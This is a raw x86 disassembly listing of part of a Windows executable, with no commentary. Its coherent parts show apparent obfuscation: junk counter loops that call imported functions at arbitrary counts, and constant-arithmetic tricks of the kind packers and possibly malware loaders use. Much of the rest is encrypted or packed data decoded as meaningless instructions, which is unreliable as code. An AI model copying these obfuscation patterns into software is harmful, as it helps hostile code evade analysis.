  403112:	data16 outs dx,BYTE PTR ds:[esi]
  403114:	dec    ecx
  403115:	and    dl,BYTE PTR [edi+0x6c]
  403118:	ret    
  403119:	mov    al,BYTE PTR ds:0xb1af2a42
  40311f:	or     BYTE PTR [ecx],0x61
  403122:	inc    ebx
  403123:	pusha  
  403124:	ins    BYTE PTR es:[edi],dx
  403125:	xor    BYTE PTR [eax+edi*8-0x60],dl
  403129:	sbb    BYTE PTR ds:0x170118ba,bl
  40312f:	lods   al,BYTE PTR ds:[esi]
  403130:	enter  0xdf0d,0xbd
  403134:	adc    eax,DWORD PTR [edx+0x7a]
  403137:	add    al,0x70
  403139:	shl    eax,0x1b
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x109cc15c],0xda
  40315f:	dec    esp
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x4030fb
  403169:	add    cl,BYTE PTR ds:0x6ec5d021
  40316f:	stc    
  403170:	inc    DWORD PTR [ebp+0x1c81c1d5]
  403176:	jo     0x403142
  403178:	es stc 
  40317a:	hlt    
  40317b:	rcr    DWORD PTR [edi],cl
  40317d:	(bad)  
  40317e:	ds (bad) 
  403180:	je     0x403110
  403182:	mov    ebp,0xa98fb77d
  403187:	inc    esp
  403188:	xor    BYTE PTR [edx-0x6da67bc9],0x1f
  40318f:	test   al,0x84
  403191:	shl    BYTE PTR [ebp+0x68],0x57
  403195:	xchg   edi,eax
  403196:	repz int3 
  403198:	push   gs
  40319a:	add    bl,dl
  40319c:	rcr    BYTE PTR [eax],0x4e
  40319f:	icebp  
  4031a0:	mov    DWORD PTR [edx+0x48],edi
  4031a3:	adc    DWORD PTR ds:0xce9e4183,edi
  4031a9:	jb     0x4031a0
  4031ab:	or     eax,0x5185e71b
  4031b0:	mov    ah,0x47
  4031b2:	enter  0xfc51,0x5b
  4031b6:	in     eax,dx
  4031b7:	lds    edx,FWORD PTR [edx+0x5f]
  4031ba:	iret   
  4031bb:	scas   al,BYTE PTR es:[edi]
  4031bc:	push   ds
  4031bd:	jl     0x40316b
  4031bf:	inc    ecx
  4031c0:	loop   0x40314b
  4031c2:	xor    BYTE PTR [eax],cl
  4031c4:	push   es
  4031c5:	jecxz  0x403156
  4031c7:	test   eax,0xed32f468
  4031cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031cd:	sbb    al,0x9f
  4031cf:	jecxz  0x403194
  4031d1:	std    
  4031d2:	jp     0x403173
  4031d4:	jno    0x403187
  4031d6:	jno    0x4031b7
  4031d8:	sbb    bl,cl
  4031da:	fidivr DWORD PTR [ebx-0x47]
  4031dd:	mov    esp,0xa96ca395
  4031e2:	xor    eax,eax
  4031e4:	lds    ecx,FWORD PTR [edi-0x4cf53e33]
  4031ea:	cmp    eax,0x74fc8c62
  4031ef:	sahf   
  4031f0:	imul   esp,esp,0x774a59a8
  4031f6:	and    BYTE PTR [edi-0x33],al
  4031f9:	mov    ?,WORD PTR [edx-0x22]
  4031fc:	xchg   ebx,eax
  4031fd:	aam    0x3f
  4031ff:	push   ss
  403200:	stos   DWORD PTR es:[edi],eax
  403201:	adc    BYTE PTR [ebx],bl
  403203:	lea    ebp,[edi-0x25]
  403206:	adc    DWORD PTR [ebp-0x5e],0x816eef22
  40320d:	sbb    eax,0xf71d9338
  403212:	mov    al,0x9e
  403214:	popf   
  403215:	pop    ecx
  403216:	iret   
  403217:	xchg   ebp,eax
  403218:	add    dl,BYTE PTR [edi]
  40321a:	add    eax,DWORD PTR [ecx-0x72]
  40321d:	push   ecx
  40321e:	repnz out dx,eax
  403220:	pusha  
  403221:	out    0x58,eax
  403223:	dec    ebp
  403224:	out    dx,eax
  403225:	cmc    
  403226:	push   eax
  403227:	dec    ecx
  403228:	leave  
  403229:	lods   eax,DWORD PTR ds:[esi]
  40322a:	pushf  
  40322b:	fmul   QWORD PTR [ebx]
  40322d:	inc    edi
  40322e:	mov    al,ds:0x4997f644
  403233:	lahf   
  403234:	repz mov edi,0x29f1d880
  40323a:	mov    edi,0xb6fbac6f
  40323f:	stc    
  403240:	xchg   esi,eax
  403241:	stos   BYTE PTR es:[edi],al
  403242:	pop    esi
  403243:	and    eax,0xa9fa6584
  403248:	mov    ch,0xe
  40324a:	(bad)  
  40324b:	mov    ecx,0xa70edc28
  403250:	jp     0x4031ed
  403252:	adc    cl,dh
  403254:	push   cs
  403255:	adc    dh,ch
  403257:	imul   ecx,DWORD PTR [ebx-0x5f],0xffffffb0
  40325b:	xor    DWORD PTR [ebx+0x511e8c03],ebp
  403261:	dec    ebx
  403262:	dec    edi
  403263:	pop    cx
  403265:	lods   eax,DWORD PTR ds:[esi]
  403266:	add    BYTE PTR [edi+0x4e37f143],ah
  40326c:	in     al,0x7f
  40326e:	fimul  DWORD PTR [ecx+0x591b325]
  403274:	add    al,0x5c
  403276:	jle    0x403222
  403278:	clc    
  403279:	cmc    
  40327a:	leave  
  40327b:	push   ebp
  40327c:	jns    0x4032eb
  40327e:	and    eax,0x6db37381
  403283:	ins    BYTE PTR es:[edi],dx
  403284:	inc    eax
  403285:	sub    al,0x6a
  403287:	push   0xfffffff5
  403289:	dec    esi
  40328a:	mov    dl,0x9
  40328c:	and    dl,BYTE PTR [esi-0x31]
  40328f:	enter  0xd10e,0xc4
  403293:	(bad)  
  403294:	retf   
  403295:	xor    al,0x2f
  403297:	das    
  403298:	push   eax
  403299:	nop
  40329a:	int3   
  40329b:	add    eax,0x749fae81
  4032a0:	fld    TBYTE PTR [ebx+0x75bc812c]
  4032a6:	shl    DWORD PTR [esi-0x31ee8efa],0xa2
  4032ad:	add    eax,0x2324486f
  4032b2:	sbb    DWORD PTR [esi],ebp
  4032b4:	ins    DWORD PTR es:[edi],dx
  4032b5:	add    eax,0x8d5ca2d
  4032ba:	push   ss
  4032bb:	xor    BYTE PTR [edx-0x2b],0x9f
  4032bf:	aad    0xf9
  4032c1:	loopne 0x40333c
  4032c3:	ins    BYTE PTR es:[edi],dx
  4032c4:	sbb    eax,0x262a239d
  4032c9:	jg     0x403341
  4032cb:	push   ss
  4032cc:	cmp    ah,BYTE PTR [ebx]
  4032ce:	adc    DWORD PTR [esi],eax
  4032d0:	mov    edx,0xc0523bc2
  4032d5:	repnz fs sti 
  4032d8:	and    ebx,DWORD PTR [ecx]
  4032da:	pop    ebp
  4032db:	jg     0x403272
  4032dd:	cmova  ebx,DWORD PTR [edi]
  4032e0:	pop    ebp
  4032e1:	js     0x40331a
  4032e3:	jb     0x4032fa
  4032e5:	xchg   ecx,eax
  4032e7:	or     bh,bh
  4032e9:	sti    
  4032ea:	les    eax,FWORD PTR [eax+0x5e]
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x2d3dd48a]
  403537:	xor    edx,DWORD PTR [edi]
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	mul    DWORD PTR [ebx-0x3fe98102]
  403547:	jns    0x403571
  403549:	addr16 icebp 
  40354b:	cmp    eax,0xd772dd7e
  403550:	push   ebx
  403551:	inc    ebp
  403552:	inc    BYTE PTR [ebx+ebx*2+0x4693dc6a]
  403559:	data16 hlt 
  40355b:	mov    esp,0x2497d364
  403560:	or     al,0x3c
  403562:	loop   0x403588
  403564:	mov    ebp,0x6c9dcf57
  403569:	jge    0x4035da
  40356b:	push   0xfffffffb
  40356d:	sub    eax,0x5a6509ed
  403572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403573:	xor    DWORD PTR [esi+0x2d7928cc],edi
  403579:	nop
  40357a:	xchg   edx,eax
  40357b:	jmp    0x2456:0x3b7577d3
  403582:	lods   eax,DWORD PTR ds:[esi]
  403583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403584:	outs   dx,BYTE PTR ds:[esi]
  403586:	cli    
  403587:	out    dx,al
  403588:	stos   DWORD PTR es:[edi],eax
  403589:	inc    esi
  40358a:	add    DWORD PTR [esi+edx*8],ecx
  40358d:	inc    esp
  40358e:	adc    esp,ebx
  403590:	mov    esi,0x5668d302
  403595:	jae    0x4035f0
  403597:	out    0xa7,eax
  403599:	pusha  
  40359a:	aad    0xec
  40359c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40359d:	mov    edx,ebp
  40359f:	mov    esp,0x5488e122
  4035a4:	outs   dx,DWORD PTR ds:[esi]
  4035a5:	out    0xc9,eax
  4035a7:	jecxz  0x40361c
  4035a9:	inc    ebp
  4035aa:	rol    edi,1
  4035ac:	jmp    0x403591
  4035ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035af:	add    ah,BYTE PTR [ebx+0x60367ae6]
  4035b5:	dec    ebx
  4035b6:	retf   0x7c95
  4035b9:	cdq    
  4035ba:	add    bh,BYTE PTR ds:0x5602f304
  4035c0:	cld    
  4035c1:	dec    eax
  4035c2:	and    ebp,DWORD PTR [edi+0x7e]
  4035c5:	lahf   
  4035c6:	mov    bh,0xf9
  4035c8:	and    al,BYTE PTR [eax]
  4035ca:	mov    esi,0x8f819254
  4035cf:	push   eax
  4035d0:	pop    edx
  4035d1:	ss mov edi,esi
  4035d4:	fidiv  WORD PTR [esi+0x88a85de]
  4035da:	outs   dx,BYTE PTR ds:[esi]
  4035db:	mov    ds,WORD PTR [edi+eiz*4+0x6b3a6251]
  4035e2:	mov    esp,0xe0bec191
  4035e7:	std    
  4035e8:	and    BYTE PTR [ecx-0x8],0xc3
  4035ec:	or     eax,0x13beb999
  4035f1:	mov    esi,edx
  4035f3:	xchg   edx,eax
  4035f4:	dec    ebx
  4035f5:	cdq    
  4035f6:	les    edx,FWORD PTR [ebp-0x16e5155a]
  4035fc:	in     al,dx
  4035fd:	pop    ds
  4035fe:	mov    ebp,0xa474183c
  403603:	aas    
  403604:	in     al,0xba
  403606:	inc    esi
  403607:	in     al,dx
  403608:	cmp    eax,0xf888fb81
  40360d:	mov    edi,0x9db87379
  403612:	test   DWORD PTR [esi+0x32d1b10],ebp
  403618:	daa    
  403619:	imul   ebp,DWORD PTR [edi+0x23],0x9
  40361d:	push   ds
  40361e:	int    0xfe
  403620:	xor    cl,dl
  403622:	imul   edi,DWORD PTR [eax+edi*4-0x64],0xffffff95
  403627:	and    eax,0xf6c854c2
  40362c:	mov    bh,0xc5
  40362e:	pop    esi
  40362f:	jnp    0x4036a5
  403631:	adc    ch,bh
  403633:	int3   
  403634:	fadd   DWORD PTR [edi]
  403636:	(bad)  
  403638:	aam    0x6a
  40363a:	outs   dx,DWORD PTR ds:[esi]
  40363b:	out    0xc5,al
  40363d:	inc    edi
  40363e:	mov    ebx,0xee5f601a
  403643:	sti    
  403644:	addr16 (bad) 
  403646:	and    ah,BYTE PTR [ebx]
  403648:	xchg   ecx,eax
  403649:	add    ah,cl
  40364b:	ficomp WORD PTR [ebp+0x39]
  40364e:	pop    eax
  40364f:	test   eax,0xa5aa5576
  403654:	xor    ebp,DWORD PTR [ebx+0x27]
  403657:	pop    eax
  403658:	into   
  403659:	out    0x64,al
  40365b:	inc    ebx
  40365c:	jb     0x403652
  40365e:	add    DWORD PTR [ecx],ecx
  403660:	dec    edx
  403661:	in     eax,0x8d
  403663:	pop    ebp
  403664:	loopne 0x403617
  403666:	dec    esp
  403667:	lock popa 
  403669:	xchg   edx,edx
  40366b:	dec    ebp
  40366c:	inc    esp
  40366d:	in     al,dx
  40366e:	data16 jo 0x4036b3
  403671:	iret   
  403672:	popf   
  403673:	jg     0x40361c
  403675:	hlt    
  403676:	int3   
  403677:	outs   dx,BYTE PTR ds:[esi]
  403678:	and    al,bh
  40367a:	inc    edx
  40367b:	adc    eax,0x6845cf4c
  403680:	mov    al,0xf0
  403682:	(bad)  
  403684:	dec    ecx
  403685:	mov    dl,0x1
  403687:	call   0x614e:0x586f919f
  40368e:	pop    eax
  40368f:	add    BYTE PTR [edx],al
  403691:	jnp    0x40370c
  403693:	(bad)  
  403694:	sbb    al,0xc9
  403696:	dec    esi
  403697:	mov    ebx,0x7f33e213
  40369c:	stos   BYTE PTR es:[edi],al
  40369d:	push   ss
  40369e:	sub    DWORD PTR [ecx],0xc9ece07
  4036a4:	mov    DWORD PTR [ebp-0x44cf3fb3],ecx
  4036aa:	mov    eax,0xbc2df720
  4036af:	ins    BYTE PTR es:[edi],dx
  4036b0:	xchg   esi,eax
  4036b1:	pop    eax
  4036b2:	stos   DWORD PTR es:[edi],eax
  4036b3:	and    DWORD PTR [ecx-0x4fb2a9cd],eax
  4036b9:	into   
  4036ba:	push   ebp
  4036bb:	push   ebx
  4036bc:	lea    ebx,[eax-0x1c]
  4036bf:	je     0x4036d7
  4036c1:	loopne 0x40371e
  4036c3:	add    dh,BYTE PTR ds:0xa7150d3
  4036c9:	cli    
  4036ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036cb:	clc    
  4036cc:	jg     0x403698
  4036ce:	mov    ds:0x76ac3f60,eax
  4036d3:	ret    
  4036d4:	fcmovb st,st(1)
  4036d6:	out    dx,eax
  4036d7:	jmp    0x7a10:0x3be3dbc6
  4036de:	lods   al,BYTE PTR ds:[esi]
  4036df:	(bad)  
  4036e0:	push   0x7a
  4036e2:	or     eax,0x40e57a1f
  4036e7:	leave  
  4036e8:	test   eax,0x4a973e36
  4036ed:	(bad)  
  4036ee:	push   ss
  4036ef:	and    al,0x77
  4036f1:	xchg   ebp,eax
  4036f2:	dec    ecx
  4036f3:	repnz int 0xa3
  4036f6:	hlt    
  4036f7:	mov    dl,0x9e
  4036f9:	std    
  4036fa:	loope  0x40371f
  4036fc:	push   esi
  4036fd:	adc    al,0xff
  4036ff:	add    DWORD PTR [esi+0x51],0x61
  403703:	inc    esp
  403704:	add    DWORD PTR [ebx-0x32c5688c],esp
  40370a:	sub    bl,BYTE PTR [edi+edi*1]
  40370d:	outs   dx,DWORD PTR ds:[esi]
  40370e:	jmp    0x40d7:0x41439c2b
  403715:	test   ebx,0xec22af7d
  40371b:	cdq    
  40371c:	mul    DWORD PTR [eax+0x40]
  40371f:	jl     0x4036af
  403721:	xor    DWORD PTR [eax],eax
  403723:	in     al,dx
  403724:	mov    dh,0x12
  403726:	hlt    
  403727:	lds    esi,FWORD PTR [esi-0x1c]
  40372a:	pop    esp
  40372b:	adc    BYTE PTR [edi-0x28],0xf9
  40372f:	(bad)  
  403730:	retf   0x341c
  403733:	mov    BYTE PTR [ebx-0x56],al
  403736:	mov    DWORD PTR ds:0xb946109d,esp
  40373d:	jl     0x4036f1
  40373f:	mov    ebx,0x9fcd3a5d
  403744:	jo     0x403776
  403746:	or     dh,BYTE PTR [eax]
  403748:	mov    dh,0x5a
  40374a:	repnz sub BYTE PTR [esi-0x253c6c52],ch
  403751:	or     al,0x76
  403753:	(bad)  
  403754:	jae    0x403777
  403756:	xchg   ebp,eax
  403757:	in     eax,dx
  403758:	fcomp  DWORD PTR [eax]
  40375a:	inc    ebx
  40375b:	jae    0x4037c7
  40375d:	inc    esi
  40375e:	or     BYTE PTR [edi+0x9],bl
  403761:	sub    eax,0xab7374ad
  403766:	es enter 0xf34b,0xd6
  40376b:	aad    0xf
  40376d:	test   al,0xe8
  40376f:	push   ecx
  403770:	bound  esi,QWORD PTR [esi-0x21]
  403773:	pop    ecx
  403774:	mov    BYTE PTR [esi],dl
  403776:	jne    0x4037d2
  403778:	in     eax,0xd4
  40377a:	cmp    ebx,DWORD PTR [edi-0x1]
  40377d:	xchg   edx,eax
  40377e:	jb     0x4037c1
  403780:	mov    ds:0xffad2295,eax
  403785:	bound  ebp,QWORD PTR [ebx+0x74d38b1d]
  40378b:	jmp    0x4037ae
  40378d:	aas    
  40378e:	(bad)  
  40378f:	stos   DWORD PTR es:[edi],eax
  403790:	lods   al,BYTE PTR ds:[esi]
  403791:	pop    ebx
  403792:	imul   DWORD PTR ds:[ecx+0xdfbff73]
  403799:	das    
  40379a:	jge    0x403729
  40379c:	jp     0x4037aa
  40379e:	xchg   ebx,eax
  40379f:	call   0x6a1d4a49
  4037a4:	fbstp  TBYTE PTR ds:0x4466addd
  4037aa:	adc    eax,0xdad20e86
  4037af:	pop    ecx
  4037b0:	inc    ebx
  4037b1:	cli    
  4037b2:	xchg   esp,eax
  4037b3:	(bad)  
  4037b4:	out    dx,al
  4037b5:	pusha  
  4037b6:	std    
  4037b7:	das    
  4037b8:	int    0x6f
  4037ba:	imul   dh
  4037bc:	std    
  4037bd:	test   eax,0xca42411e
  4037c2:	mov    ds:0xbe396473,eax
  4037c7:	scas   al,BYTE PTR es:[edi]
  4037c8:	or     ch,bl
  4037ca:	sti    
  4037cb:	nop
  4037cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037ce:	mov    edi,0x81050d44
  4037d3:	imul   esp,ecx,0xffffffe9
  4037d6:	scas   al,BYTE PTR es:[edi]
  4037d7:	test   eax,0xca72593
  4037dc:	push   0xfffffff4
  4037de:	push   edi
  4037df:	inc    edi
  4037e0:	sbb    BYTE PTR [ecx],0x18
  4037e3:	cs ret 0x9c48
  4037e7:	imul   ecx,DWORD PTR [edx-0x17],0x14b0fbc6
  4037ee:	push   cs
  4037ef:	cdq    
  4037f0:	imul   esp,DWORD PTR [edx+eax*8],0xffffffb2
  4037f4:	and    ecx,DWORD PTR [esi+0x22512c58]
  4037fa:	sar    DWORD PTR [edi-0x21],0x10
  4037fe:	jae    0x40378e
  403800:	sub    eax,0x2aa20943
  403805:	xchg   esi,eax
  403806:	(bad)  
  403807:	stc    
  403808:	popa   
  403809:	or     DWORD PTR [ebp-0x4a],0x33
  40380d:	popa   
  40380e:	jb     0x40386d
  403810:	add    DWORD PTR [ebp+esi*2+0x2b],eax
  403814:	mov    esi,0x17070b87
  403819:	into   
  40381a:	aad    0xea
  40381c:	add    ch,al
  40381e:	jl     0x40387a
  403820:	jecxz  0x4037a2
  403822:	nop
  403823:	mov    esp,0xc70f83f8
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
